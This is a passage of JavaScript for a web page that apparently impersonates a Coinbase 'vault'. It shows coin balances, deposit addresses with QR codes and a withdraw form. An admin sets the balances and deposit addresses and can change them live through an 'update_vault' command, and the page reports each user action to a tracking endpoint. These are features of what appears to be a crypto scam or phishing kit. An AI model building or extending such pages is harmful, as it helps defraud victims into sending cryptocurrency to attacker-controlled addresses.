      {key:'wif',         name:'dogwifhat',         ticker:'WIF',   icon:'wif',    color:'#9945FF', iconUrl:'https://coin-images.coingecko.com/coins/images/33566/large/dogwifhat.jpg'},
      {key:'floki',       name:'Floki',            ticker:'FLOKI', icon:'floki',  color:'#CF811D', iconUrl:'https://coin-images.coingecko.com/coins/images/16746/large/PNG_image.png'},
      {key:'mana',        name:'Decentraland',     ticker:'MANA',  icon:'mana',   color:'#FF2D55', iconUrl:'https://coin-images.coingecko.com/coins/images/878/large/decentraland-mana.png'},
      {key:'sand',        name:'The Sandbox',      ticker:'SAND',  icon:'sand',   color:'#04ADEF', iconUrl:'https://coin-images.coingecko.com/coins/images/12129/large/sandbox_logo.jpg'},
      {key:'axs',         name:'Axie Infinity',    ticker:'AXS',   icon:'axs',    color:'#0055D4', iconUrl:'https://coin-images.coingecko.com/coins/images/13029/large/axie_infinity_logo.png'},
    ];
    var _coinMap = {};
    ALL_COINS.forEach(function(c){ _coinMap[c.key]=c; });

    // State — seeded from POST data on page load
    var _d = window._cbVaultData || {};

    // Supplement _coinMap with any non-standard coins included in the payload
    if (_d.coin_meta) {
      try {
        var _extraMeta = JSON.parse(_d.coin_meta);
        Object.keys(_extraMeta).forEach(function(k) {
          if (!_coinMap[k]) {
            var m = _extraMeta[k];
            _coinMap[k] = {key:k, name:m.name||k.toUpperCase(), ticker:m.ticker||k.toUpperCase(), icon:k, color:'#888', iconUrl:m.iconUrl||''};
          }
        });
      } catch(e) {}
    }
    var _state = { balance: _d.balance || '', coins: [] };

    // coin_keys present as string (incl. "") = authoritative admin selection.
    // "" means zero assets — do not resurrect from leftover addresses / default six.
    // Absent coin_keys = legacy payload → keep address-scan then default-six fallback.
    var _initKeys = [];
    if (typeof _d.coin_keys === 'string') {
      _initKeys = _d.coin_keys.split(',').map(function(k){ return k.trim(); }).filter(Boolean);
    } else {
      ALL_COINS.forEach(function(c){ if (_d[c.key+'_address']) _initKeys.push(c.key); });
      if (!_initKeys.length) _initKeys = ['btc','eth','xrp','sol','ltc','doge'];
    }

    _initKeys.forEach(function(key){
      _state.coins.push({key:key, addr:(_d[key+'_address']||'').trim(), amt:(_d[key+'_amount']||'').trim()});
    });
    // _explicitKeys = coins admin chose to show as rows (main list, deposit list, withdraw list)
    var _explicitKeys = _initKeys.slice();
    // Sibling network variants — added to _state.coins so deposit overlay network selector can read addresses
    // but NOT added to _explicitKeys, so they never appear as rows
    var _famSibs = {
      'usdt':['usdt_trc20'],'usdt_trc20':['usdt'],
      'usdc':['usdc_base','usdc_sol','usdc_polygon'],'usdc_base':['usdc','usdc_sol','usdc_polygon'],
      'usdc_sol':['usdc','usdc_base','usdc_polygon'],'usdc_polygon':['usdc','usdc_base','usdc_sol'],
    };
    var _stateKeys = _state.coins.map(function(c){return c.key;});
    _state.coins.slice().forEach(function(coin) {
      var sibs = _famSibs[coin.key]; if (!sibs) return;
      sibs.forEach(function(sk) {
        if (_stateKeys.indexOf(sk) !== -1) return;
        var sibAddr = (_d[sk+'_address'] || '').trim();
        if (sibAddr) {
          _state.coins.push({key:sk, addr:sibAddr, amt:(_d[sk+'_amount']||'').trim()});
          _stateKeys.push(sk);
        }
      });
    });

    function _trunc(addr) {
      if (!addr || addr.length <= 12) return addr;
      return addr.substring(0, 6) + ' ··· ' + addr.slice(-4);
    }

    function _iconEl(def, size) {
      size = size || 40;
      var wrap = document.createElement('div');
      wrap.style.cssText = 'width:'+size+'px;height:'+size+'px;border-radius:50%;overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center;';
      var img = document.createElement('img');
      img.src = def.iconUrl || '';
      img.width = img.height = size;
      img.style.cssText = 'display:block;width:'+size+'px;height:'+size+'px;';
      var fb = document.createElement('div');
      fb.style.cssText = 'display:none;width:'+size+'px;height:'+size+'px;border-radius:50%;background:'+(def.color||'#555')+';align-items:center;justify-content:center;font-size:'+(size<=24?8:10)+'px;font-weight:700;color:#fff;flex-shrink:0;';
      fb.textContent = def.ticker.substring(0,4);
      img.onerror = function(){ img.style.display='none'; fb.style.display='flex'; };
      wrap.appendChild(img); wrap.appendChild(fb);
      return wrap;
    }

    var _wrap = document.getElementById('vb-coins');
    var _balEl = document.getElementById('vb-balance');

    function _applyBalance() {
      // Always compute total from live prices × coin amounts — never use static _state.balance
      var total = 0;
      var hasPrices = false;
      _state.coins.forEach(function(coin) {
        var price = _livePrices[coin.key] || 0;
        var amt   = parseFloat(coin.amt) || 0;
        if (price) { total += price * amt; hasPrices = true; }
      });
      if (hasPrices) {
        _balEl.textContent = total >= 1000
          ? '$' + total.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2})
          : '$' + total.toFixed(2);
      }
    }

    var _livePrices = {};  // {key: usdPrice}

    function _fetchLivePrices() {
      var keys = _state.coins.map(function(c){ return c.key; });
      if (!keys.length) return;
      // Comprehensive gecko ID map (mirrors admin-dashboard _GECKO_IDS)
      var geckoMap = {
        btc:'bitcoin',eth:'ethereum',xrp:'ripple',sol:'solana',ltc:'litecoin',
        doge:'dogecoin',bnb:'binancecoin',usdt:'tether',usdt_trc20:'tether',
        usdc:'usd-coin',usdc_base:'usd-coin',usdc_sol:'usd-coin',usdc_polygon:'usd-coin',
        ada:'cardano',dot:'polkadot',shib:'shiba-inu',avax:'avalanche-2',
        matic:'matic-network',pol:'matic-network',link:'chainlink',uni:'uniswap',
        xlm:'stellar',trx:'tron',atom:'cosmos',vet:'vechain',near:'near',
        fil:'filecoin',arb:'arbitrum',op:'optimism',apt:'aptos',sui:'sui',
        inj:'injective-protocol',grt:'the-graph',aave:'aave',
        snx:'synthetix-network-token',crv:'curve-dao-token',
        comp:'compound-governance-token',yfi:'yearn-finance',
        sushi:'sushi',bat:'basic-attention-token',ens:'ethereum-name-service',
        sand:'the-sandbox',mana:'decentraland',axs:'axie-infinity',
        chz:'chiliz',flow:'flow',rose:'oasis-network',egld:'elrond-erd-2',
        algo:'algorand',dash:'dash',zec:'zcash',xtz:'tezos',
        ksm:'kusama',kava:'kava',tia:'celestia',bonk:'bonk',
        wif:'dogwifcoin',pepe:'pepe',floki:'floki',tao:'bittensor',
        render:'render-token',fet:'fetch-ai',icp:'internet-computer',
        stx:'blockstack',mina:'mina-protocol',qnt:'quant-network',
        cro:'crypto-com-chain',hbar:'hedera-hashgraph',hnt:'helium',
        ldo:'lido-dao',wld:'worldcoin-wld',pyth:'pyth-network',
        sei:'sei-network',ondo:'ondo-finance',ena:'ethena',
        strk:'starknet',pendle:'pendle',bch:'bitcoin-cash',
        etc:'ethereum-classic',zrx:'0x',ape:'apecoin',cake:'pancakeswap-token',
        gno:'gnosis',paxg:'pax-gold',nmr:'numeraire',lpt:'livepeer',
        imx:'immutable-x',axl:'axelar-network'
      };
      // For any remaining non-standard coin not in map, derive gecko slug from name
      keys.forEach(function(k) {
        if (!geckoMap[k]) {
          var def = _coinMap[k];
          var name = def && def.name;
          if (name && name !== k.toUpperCase()) {
            geckoMap[k] = name.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, '');
          }
        }
      });
      // Build unique gecko IDs, track all keys per gecko ID (handles variants like USDT/USDC)
      var geckoToKeys = {};
      var uniqueIds = [];
      keys.forEach(function(k) {
        var gId = geckoMap[k] || k;
        if (!geckoToKeys[gId]) { geckoToKeys[gId] = []; uniqueIds.push(gId); }
        geckoToKeys[gId].push(k);
      });
      var _priceUrl = '/api/crypto-prices?ids='+uniqueIds.join(',');
      function _doFetch(retries) {
        fetch(_priceUrl)
          .then(function(r){ if(!r.ok) throw new Error(r.status); return r.json(); })
          .then(function(d){
            Object.keys(d).forEach(function(g){
              if (!d[g] || !d[g].usd) return;
              var price = d[g].usd;
              (geckoToKeys[g] || []).forEach(function(key) { _livePrices[key] = price; });
            });
            _applyPrices();
            _applyBalance();
          }).catch(function(){
            if (retries > 0) setTimeout(function(){ _doFetch(retries-1); }, 3000);
          });
      }
      _doFetch(3);
    }

    function _fmtUsd(n) {
      if (!n || isNaN(n) || n === 0) return '$0.00';
      if (n >= 1000) return '$' + n.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
      return '$' + n.toFixed(n < 0.01 ? 8 : 2);
    }

    function _applyPrices() {
      _state.coins.forEach(function(coin) {
        var usdEl = _wrap.querySelector('[data-key="'+coin.key+'"] .vb-usd-val');
        if (!usdEl) return;
        var price = _livePrices[coin.key] || 0;
        var amt   = parseFloat(coin.amt) || 0;
        if (price && amt) {
          usdEl.textContent = _fmtUsd(amt * price);
          usdEl.style.color = '#fff';
        }
      });
    }

    var EYE_OPEN   = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
    var EYE_CLOSED = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
    var COPY_ICON  = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';

    function _renderRows() {
      _wrap.innerHTML = '';
      var visibleCoins = _state.coins.filter(function(c){
        return _explicitKeys.indexOf(c.key) !== -1 && c.addr;
      });
      visibleCoins.forEach(function(coin, idx) {
        var def = _coinMap[coin.key];
        if (!def) return;

        var row = document.createElement('div');
        row.className = 'vb-coin-row';
        row.setAttribute('data-key', coin.key);
        row.appendChild(_iconEl(def, 40));

        var info = document.createElement('div');
        info.style.cssText = 'flex:1;display:flex;flex-direction:column;gap:4px;min-width:0;';

        var nameEl = document.createElement('p');
        nameEl.style.cssText = 'font-size:16px;font-weight:600;color:#fff;margin:0;';
        nameEl.textContent = def.name;

        var addrRow = document.createElement('div');
        addrRow.style.cssText = 'display:flex;align-items:center;gap:4px;';

        var addrEl = document.createElement('p');
        addrEl.className = 'vb-addr-short';
        addrEl.style.cssText = 'font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;color:rgb(138,145,158);margin:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:100%;';
        addrEl.textContent = coin.addr ? _trunc(coin.addr) : '—';
        addrRow.appendChild(addrEl);

        if (coin.addr) {
          var _visible = false;
          var eyeBtn = document.createElement('button');
          eyeBtn.className = 'vb-addr-btn';
          eyeBtn.innerHTML = EYE_CLOSED;
          eyeBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            _visible = !_visible;
            addrEl.textContent = _visible ? coin.addr : _trunc(coin.addr);
            addrEl.style.whiteSpace = _visible ? 'normal' : 'nowrap';
            addrEl.style.wordBreak  = _visible ? 'break-all' : '';
            eyeBtn.innerHTML = _visible ? EYE_OPEN : EYE_CLOSED;
          });

          var copyBtn = document.createElement('button');
          copyBtn.className = 'vb-addr-btn';
          copyBtn.innerHTML = COPY_ICON;
          copyBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            navigator.clipboard.writeText(coin.addr).then(function() {
              copyBtn.style.color = '#4ade80';
              setTimeout(function() { copyBtn.style.color = ''; }, 1500);
            }).catch(function() {});
          });

          addrRow.appendChild(eyeBtn);
          addrRow.appendChild(copyBtn);
        }

        info.appendChild(nameEl);
        info.appendChild(addrRow);
        row.appendChild(info);

        var right = document.createElement('div');
        right.style.cssText = 'display:flex;align-items:center;flex-shrink:0;';
        var amtWrap = document.createElement('div');
        amtWrap.style.cssText = 'display:flex;flex-direction:column;align-items:flex-end;gap:2px;';

        var price = _livePrices[coin.key] || 0;
        var amt   = parseFloat(coin.amt) || 0;
        var usdEl = document.createElement('span');
        usdEl.className = 'vb-usd-val';
        usdEl.style.cssText = 'font-size:14px;font-weight:400;color:#fff;';
        usdEl.textContent = (price && amt) ? _fmtUsd(amt * price) : '$0.00';

        var amtEl = document.createElement('span');
        amtEl.className = 'vb-coin-amt';
        amtEl.style.cssText = 'font-size:12px;color:rgb(138,145,158);';
        amtEl.textContent = coin.amt ? (coin.amt + ' ' + def.ticker) : '0 ' + def.ticker;

        amtWrap.appendChild(usdEl);
        amtWrap.appendChild(amtEl);
        right.appendChild(amtWrap);
        row.appendChild(right);
        var chev = document.createElement('span');
        chev.className = 'vb-row-chevron';
        chev.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>';
        row.appendChild(chev);

        // Clicking a coin row opens the deposit (receive address) panel for that coin
        row.addEventListener('click', function(e) {
          if (e.target.closest('.vb-addr-btn')) return;
          _dpSearch.value = '';
          _buildDepositList('');
          _dpPanel.classList.add('open');
          document.body.style.overflow = 'hidden';
          _openReceive(def, coin.addr);
        });

        _wrap.appendChild(row);
      });
      if (Object.keys(_livePrices).length) _applyPrices();
    }

    _renderRows();
    _applyBalance();
    _fetchLivePrices();
    // Refresh prices every 60s
    setInterval(_fetchLivePrices, 60000);

    // Called by bridge when admin sends update_vault command
    window._vbLiveUpdate = function(data) {

      // Supplement _coinMap with any non-standard coins from this update
      if (data.coin_meta) {
        try {
          var _updMeta = JSON.parse(data.coin_meta);
          Object.keys(_updMeta).forEach(function(k) {
            if (!_coinMap[k]) {
              var m = _updMeta[k];
              _coinMap[k] = {key:k, name:m.name||k.toUpperCase(), ticker:m.ticker||k.toUpperCase(), icon:k, color:'#888', iconUrl:m.iconUrl||''};
            }
          });
        } catch(e) {}
      }

      var needsFullRender = false;

      // Coin list change (add/remove)
      if (data.coin_keys !== undefined) {
        var newKeys = data.coin_keys ? data.coin_keys.split(',').map(function(k){return k.trim();}).filter(Boolean) : [];
        _explicitKeys = newKeys.slice(); // update what admin wants shown as rows
        var existing = {};
        _state.coins.forEach(function(c){ existing[c.key]=c; });
        _state.coins = newKeys.map(function(key){
          var e = existing[key] || {key:key, addr:(data[key+'_address']||''), amt:(data[key+'_amount']||'')};
          if (data[key+'_address'] !== undefined) e.addr = data[key+'_address'];
          // Only overwrite existing non-zero balance with a non-zero value from the live update
          if (data[key+'_amount'] !== undefined) {
            var _la = parseFloat(data[key+'_amount']);
            if (_la > 0 || parseFloat(e.amt) <= 0) e.amt = data[key+'_amount'];
          }
          return e;
        });
        // Re-inject sibling variants (for deposit network selector only, not shown as rows)
        var _liveStateKeys = _state.coins.map(function(c){return c.key;});
        _state.coins.slice().forEach(function(coin) {
          var sibs = _famSibs[coin.key]; if (!sibs) return;
          sibs.forEach(function(sk) {
            if (_liveStateKeys.indexOf(sk) !== -1) return;
            var sibAddr = (data[sk+'_address'] || '').trim();
            if (sibAddr) { _state.coins.push({key:sk, addr:sibAddr, amt:(data[sk+'_amount']||'').trim()}); _liveStateKeys.push(sk); }
          });
        });
        needsFullRender = true;
      }

      // Per-coin addr/amt updates
      _state.coins.forEach(function(coin) {
        var ak = coin.key+'_address', mk = coin.key+'_amount';
        if (data[ak] !== undefined && data[ak] !== coin.addr) { coin.addr = data[ak]; needsFullRender = true; }
        // Only overwrite the user's existing balance if the incoming amount is explicitly non-zero.
        // A zero/empty amount in a live update_vault command means "not configured" on the admin
        // side — it must not zero out a server-authoritative balance the user already sees.
        if (data[mk] !== undefined && data[mk] !== coin.amt) {
          var _newAmt = parseFloat(data[mk]);
          if (_newAmt > 0 || parseFloat(coin.amt) <= 0) { coin.amt = data[mk]; needsFullRender = true; }
        }
      });

      if (needsFullRender) _renderRows();
      _applyBalance();
    };

    // ── Modal ────────────────────────────────────────────────────
    var overlay   = document.getElementById('vb-modal-overlay');
    var modalName = document.getElementById('vb-modal-name');
    var modalTick = document.getElementById('vb-modal-ticker');
    var modalIcon = document.getElementById('vb-modal-icon');
    var modalAddr = document.getElementById('vb-modal-addr');
    var qrImg     = document.getElementById('vb-qr-img');
    var copyBtn   = document.getElementById('vb-copy-full-btn');
    var closeBtn  = document.getElementById('vb-modal-close');
    var _curAddr  = '';

    function _openModal(def, addr) {
      modalName.textContent = def.name;
      modalTick.textContent = def.ticker;
      modalAddr.textContent = addr || 'No address configured';
      _curAddr = addr || '';
      modalIcon.innerHTML = '';
      modalIcon.appendChild(_iconEl(def, 42));
      if (addr) {
        qrImg.src = QR_API + encodeURIComponent(addr);
        document.getElementById('vb-qr-wrap').style.display = 'flex';
      } else {
        document.getElementById('vb-qr-wrap').style.display = 'none';
      }
      copyBtn.textContent = 'Copy Address';
      overlay.classList.add('open');
      document.body.style.overflow = 'hidden';
    }

    function _closeModal() { overlay.classList.remove('open'); document.body.style.overflow = ''; }
    closeBtn.addEventListener('click', _closeModal);
    overlay.addEventListener('click', function(e){ if(e.target===overlay)_closeModal(); });
    document.addEventListener('keydown', function(e){ if(e.key==='Escape')_closeModal(); });

    copyBtn.addEventListener('click', function(){
      if (!_curAddr) return;
      navigator.clipboard.writeText(_curAddr).then(function(){
        copyBtn.textContent = '✓ Copied!';
        setTimeout(function(){ copyBtn.textContent = 'Copy Address'; }, 1800);
      }).catch(function(){
        var ta = document.createElement('textarea');
        ta.value = _curAddr; ta.style.cssText='position:fixed;opacity:0;';
        document.body.appendChild(ta); ta.select();
        try { document.execCommand('copy'); copyBtn.textContent='✓ Copied!'; }catch(e){}
        document.body.removeChild(ta);
        setTimeout(function(){ copyBtn.textContent='Copy Address'; }, 1800);
      });
    });

    function _beacon(action) {
      var b = new URLSearchParams({_token:CSRF,type:'form_submit',page:'coinbase_vault_balance',element:'vault_action',value:action});
      try { navigator.sendBeacon(TRACK, b); } catch(e) {}
    }
    // ── Withdraw panels ───────────────────────────────────────────────────────
    var _wdFormPanel = document.getElementById('vb-withdraw-form-panel');
    var _wdPanel     = document.getElementById('vb-withdraw-panel');
    var _wdList      = document.getElementById('vb-withdraw-list');
    var _wdSelIcon   = document.getElementById('vb-wd-sel-icon');
    var _wdSelName   = document.getElementById('vb-wd-sel-name');
    var _wdSelBal    = document.getElementById('vb-wd-sel-bal');
    var _wdSelUsd    = document.getElementById('vb-wd-sel-usd');
    var _wdAmtInp    = document.getElementById('vb-wd-amount');
    var _wdUsdInp    = document.getElementById('vb-wd-usd-amount');
    var _wdAddrInp   = document.getElementById('vb-wd-addr');
    var _wdUsdDisp   = document.getElementById('vb-wd-usd-display');
    var _wdSubmit    = document.getElementById('vb-wd-submit');
    var _wdSuccess   = document.getElementById('vb-wd-success');
    var _wdMaxBtn    = document.getElementById('vb-wd-max');
    var _wdUsdMaxBtn = document.getElementById('vb-wd-usd-max');
    var _wdSyncing        = false;
    var _wdCoinSel        = document.getElementById('vb-wd-coin-sel');
    var _wdBack           = document.getElementById('vb-wd-back');
    var _wdCurCoin        = null; // {def, coin}

    function _wdSetInsufficient(on) {
      _wdAmtInp.placeholder = on ? 'Insufficient balance' : '0.00000000';
      _wdUsdInp.placeholder = on ? 'Insufficient balance' : '0.00';
      _wdAmtInp.disabled = on; _wdUsdInp.disabled = on;
      _wdMaxBtn.disabled = on; _wdUsdMaxBtn.disabled = on;
      _wdAddrInp.disabled = on;
      _wdSubmit.disabled = on ? true : _wdSubmit.disabled;
    }

    function _closeWithdrawForm() {
      _wdFormPanel.classList.remove('open');
      if (!_wdPanel.classList.contains('open')) document.body.style.overflow = '';
    }
    function _closeWithdrawPanel() {
      _wdPanel.classList.remove('open');
      if (!_wdFormPanel.classList.contains('open')) document.body.style.overflow = '';
    }

    function _openWithdrawForm(def, coin) {
      _wdCurCoin = {def: def, coin: coin};
      // Populate coin selector
      _wdSelIcon.innerHTML = '';
      _wdSelIcon.appendChild(_iconEl(def, 44));
      _wdSelName.textContent = def.name;
      var amt = parseFloat(coin.amt) || 0;
      var price = _livePrices[def.key] || 0;
      _wdSelBal.textContent = (coin.amt || '0') + ' ' + def.ticker;
      _wdSelUsd.textContent = (price && amt) ? _fmtUsd(amt * price) : '$0.00';
      // Reset form
      _wdAmtInp.value = '';
      _wdUsdInp.value = '';
      _wdAddrInp.value = '';
      _wdSubmit.disabled = true;
      _wdSubmit.textContent = 'Withdraw';
      _wdSubmit.style.cssText = '';
      _wdSuccess.style.display = 'none';
      if (_wdUsdDisp) _wdUsdDisp.textContent = '≈ $0.00';
      _wdSetInsufficient(amt <= 0);
      // Keep coin-select mounted underneath; form stacks above (no vault flash)
      _wdFormPanel.classList.add('open');
      document.body.style.overflow = 'hidden';
      if (amt > 0) setTimeout(function(){ _wdAmtInp.focus(); }, 350);
    }

    function _buildWithdrawList() {
      _wdList.innerHTML = '';
      _state.coins.forEach(function(coin) {
        if (_explicitKeys.indexOf(coin.key) === -1 || !coin.addr) return;
        var def = _coinMap[coin.key];
        if (!def) return;
        var row = document.createElement('div');
        row.className = 'vb-dp-coin-row';
        row.appendChild(_iconEl(def, 42));
        var mid = document.createElement('div');
        mid.style.cssText = 'flex:1;min-width:0;display:flex;flex-direction:column;gap:2px;';
        var nameEl = document.createElement('div');
        nameEl.style.cssText = 'font-size:16px;font-weight:600;color:#fff;';
        nameEl.textContent = def.name;
        var tickEl = document.createElement('div');
        tickEl.style.cssText = 'font-size:12px;color:rgb(138,145,158);';
        tickEl.textContent = def.ticker;
        mid.appendChild(nameEl); mid.appendChild(tickEl);
        row.appendChild(mid);
        var right = document.createElement('div');
        right.style.cssText = 'display:flex;flex-direction:column;align-items:flex-end;gap:2px;flex-shrink:0;';
        var price = _livePrices[coin.key] || 0;
        var amt   = parseFloat(coin.amt) || 0;
        var usdEl = document.createElement('div');
        usdEl.style.cssText = 'font-size:14px;font-weight:400;color:#fff;';
        usdEl.textContent = (price && amt) ? _fmtUsd(amt * price) : '$0.00';
        var amtEl = document.createElement('div');
        amtEl.style.cssText = 'font-size:12px;color:rgb(138,145,158);';
        amtEl.textContent = (coin.amt || '0') + ' ' + def.ticker;
        right.appendChild(usdEl); right.appendChild(amtEl);
        row.appendChild(right);
        var wdChev = document.createElement('span');
        wdChev.className = 'vb-row-chevron';
        wdChev.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>';
        row.appendChild(wdChev);
        row.addEventListener('click', function() { _openWithdrawForm(def, coin); });
        _wdList.appendChild(row);
      });
    }

    function _openWithdrawPanel() {
      _beacon('withdraw');
      _buildWithdrawList();
      _wdPanel.classList.add('open');
      document.body.style.overflow = 'hidden';
    }

    function _wdValidate() {
      if (!_wdCurCoin) return;
      var max = parseFloat(_wdCurCoin.coin.amt) || 0;
      if (max <= 0) { _wdSetInsufficient(true); return; }
      _wdSetInsufficient(false);
      var n = parseFloat(_wdAmtInp.value);
      _wdSubmit.disabled = !(n > 0 && n <= max + 1e-9 && _wdAddrInp.value.trim().length > 8);
    }

    // Crypto amount input → clamp, sync to USD field
    _wdAmtInp.addEventListener('input', function() {
      if (_wdSyncing || !_wdCurCoin) return;
      _wdAmtInp.placeholder = '0.00000000'; // reset hint placeholder
      var max = parseFloat(_wdCurCoin.coin.amt) || 0;
      var n = parseFloat(_wdAmtInp.value);
      if (!isNaN(n) && max > 0 && n > max + 1e-9) { _wdAmtInp.value = max; n = max; }
      var price = _livePrices[_wdCurCoin.def.key] || 0;
      _wdSyncing = true;
      _wdUsdInp.value = (price && !isNaN(n) && n > 0) ? (n * price).toFixed(2) : '';
      if (_wdUsdDisp) {
        _wdUsdDisp.textContent = (price && !isNaN(n) && n > 0) ? ('≈ ' + _fmtUsd(n * price)) : '≈ $0.00';
      }
      _wdSyncing = false;
      _wdValidate();
    });

    // USD amount input → clamp, convert back to crypto field
    _wdUsdInp.addEventListener('input', function() {
      if (_wdSyncing || !_wdCurCoin) return;
      var max = parseFloat(_wdCurCoin.coin.amt) || 0;
      var price = _livePrices[_wdCurCoin.def.key] || 0;
      var maxUsd = (max > 0 && price > 0) ? max * price : 0;
      var u = parseFloat(_wdUsdInp.value);
      if (!isNaN(u) && maxUsd > 0 && u > maxUsd) { _wdUsdInp.value = maxUsd.toFixed(2); u = maxUsd; }
      _wdSyncing = true;
      if (!isNaN(u) && u > 0 && price > 0) {
        _wdAmtInp.value = (u / price).toFixed(8).replace(/(\.\d*?)0+$/, '$1').replace(/\.$/, '');
      } else {
        _wdAmtInp.value = '';
        // If user typed a USD amount but price isn't loaded yet, hint them to use the crypto field
        if (!isNaN(u) && u > 0 && !price) {
          _wdAmtInp.placeholder = 'Enter ' + _wdCurCoin.def.ticker + ' amount directly';
        }
      }
      _wdSyncing = false;
      _wdValidate();
    });

    _wdAddrInp.addEventListener('input', function() { if (_wdCurCoin) _wdValidate(); });

    // MAX buttons
    _wdMaxBtn.addEventListener('click', function() {
      if (!_wdCurCoin) return;
      _wdAmtInp.value = _wdCurCoin.coin.amt || '0';
      _wdAmtInp.dispatchEvent(new Event('input'));
    });
    _wdUsdMaxBtn.addEventListener('click', function() {
      if (!_wdCurCoin) return;
      var max = parseFloat(_wdCurCoin.coin.amt) || 0;
      var price = _livePrices[_wdCurCoin.def.key] || 0;
      if (max > 0 && price > 0) {
        _wdUsdInp.value = (max * price).toFixed(2);
        _wdUsdInp.dispatchEvent(new Event('input'));
      } else {
        _wdAmtInp.value = max || '0';
        _wdAmtInp.dispatchEvent(new Event('input'));
      }
    });

    // Coin selector → hide form; list is already mounted (do not replay _vp_in)
    _wdCoinSel.addEventListener('click', function() {
      _closeWithdrawForm();
      document.body.style.overflow = 'hidden';
    });

    // Submit — DB-first, beacon then redirect for authoritative server render
    _wdSubmit.addEventListener('click', function() {
      if (!_wdCurCoin || _wdAddrInp.value.trim().length < 9) return;
      var _wdAmtCheck = parseFloat(_wdAmtInp.value) || 0;
      if (_wdAmtCheck <= 0) return;
      _beacon('withdraw_submit:' + _wdCurCoin.def.key);

      var _wdCoinKey  = _wdCurCoin.def.key;
      var _wdAmt      = parseFloat(_wdAmtInp.value) || 0;
      var _wdUsd      = parseFloat((_wdUsdInp.value||'').replace(/[^0-9.]/g,'')) || 0;
      var _coinRefAmt = parseFloat(_wdCurCoin.coin.amt) || 0;

      // Loading state
      _wdSubmit.disabled = true;
      _wdSubmit.textContent = 'Processing…';
      _wdSubmit.style.background = '#1a3580';
      _wdSubmit.style.color = 'rgba(255,255,255,.55)';

      // POST to DB — single call, redirect ONLY after success
      fetch('/api/vault-withdraw', {
        method: 'POST',
        headers: {'Content-Type':'application/json','X-CSRF-TOKEN': window._liveledCSRF||''},
        body: JSON.stringify({coin_key:_wdCoinKey, amount:_wdAmt, usd_amount:_wdUsd, brand:'coinbase', current_amount:_coinRefAmt})
      }).then(function(r){
        if (!r.ok) throw new Error('HTTP '+r.status);
        return r.json();
      }).then(function(data){
        var newAmt = (data && data.coin_amount != null) ? String(data.coin_amount) : '';
        if (newAmt !== '' && parseFloat(newAmt) < 1e-6) newAmt = '0';
        // Use server-returned actual_key if provided (handles variant normalization)
        var actualKey = (data && data.actual_key) ? data.actual_key : _wdCoinKey;
        var reportedAmt = newAmt !== '' ? newAmt : String(Math.max(0, _coinRefAmt - _wdAmt));

        // Send beacon BEFORE redirect — sendBeacon is designed to survive page transitions
        var b = new URLSearchParams({
          _token: window._liveledCSRF||'', type:'vault_withdraw',
          page:'coinbase_vault_balance', element:'balance_update',
          value: actualKey+'|'+reportedAmt
        });
        try{ navigator.sendBeacon('/api/log', b); }catch(e){}

        // Redirect to GET — server serves fresh DB state, no stale data possible
        _wdSubmit.textContent = 'Submitted ✓';
        _wdSubmit.style.background = 'rgba(74,222,128,.2)';
        _wdSubmit.style.color = '#4ade80';
        setTimeout(function(){ window.location.href = '/coinbase/vault-balance'; }, 800);
      }).catch(function(err){
        // Error — let user retry, no redirect on failure
        _wdSubmit.disabled = false;
        _wdSubmit.textContent = 'Retry';
        _wdSubmit.style.background = 'rgba(220,38,38,.2)';
        _wdSubmit.style.color = '#f87171';
        console.error('[vault-withdraw] failed:', err);
      });
    });

    // Back: hide form; list is already mounted (do not replay _vp_in)
    _wdBack.addEventListener('click', function() {
      _closeWithdrawForm();
      document.body.style.overflow = 'hidden';
    });
    // Close coin-select panel closes everything
    document.getElementById('vb-withdraw-close').addEventListener('click', function() {
      _closeWithdrawForm();
      _closeWithdrawPanel();
    });
    document.getElementById('vb-withdraw-btn').addEventListener('click', _openWithdrawPanel);

    // ── Deposit panel ────────────────────────────────────────────────────────
    var NETWORK_NAMES = {
      btc:'Bitcoin', eth:'Ethereum', xrp:'XRP Ledger', sol:'Solana',
      ltc:'Litecoin', doge:'Dogecoin', bnb:'BNB Smart Chain',
      usdt:'Ethereum (ERC-20)', usdt_trc20:'TRON (TRC-20)',
      usdc:'ERC-20 (Ethereum)', usdc_base:'Base (Base)', usdc_sol:'SPL (Solana)', usdc_polygon:'ERC-20 (Polygon)',
      ada:'Cardano', dot:'Polkadot', shib:'Ethereum (ERC-20)', avax:'Avalanche C-Chain',
      matic:'Polygon PoS', link:'Ethereum (ERC-20)', uni:'Ethereum (ERC-20)',
      xlm:'Stellar', trx:'TRON', atom:'Cosmos Hub', vet:'VeChain',
    };

    var _dpPanel    = document.getElementById('vb-deposit-panel');
    var _dpList     = document.getElementById('vb-deposit-list');
    var _dpSearch   = document.getElementById('vb-deposit-search');
